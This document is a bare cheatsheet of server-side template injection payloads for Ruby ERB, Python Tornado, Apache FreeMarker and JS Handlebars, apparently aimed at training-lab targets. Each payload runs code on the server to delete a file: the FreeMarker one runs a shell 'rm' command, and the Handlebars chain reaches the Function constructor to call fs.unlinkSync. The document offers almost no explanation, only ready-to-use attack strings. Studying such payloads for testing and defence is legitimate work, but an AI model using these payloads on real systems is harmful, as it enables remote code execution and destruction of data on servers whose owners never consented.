[Cheatsheet](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
# Ruby ERB
[ERB Security Chapter](https://docs.ruby-lang.org/en/2.3.0/security_rdoc.html)
```
<%=File.delete('/home/carlos/morale.txt');%>
```
# Python Tornado
```
user.first_name}}{{1;import+os;os.remove('/home/carlos/morale.txt');print('gg')}}
```
# Apache FreeMarker
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm /home/carlos/morale.txt")}
```
# JS Handlebars
```
{{#with "hola" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "fs.unlinkSync('/home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
```
{{#with "hola" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "fs.unlinkSync('/home/carlos/morale.txt');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```
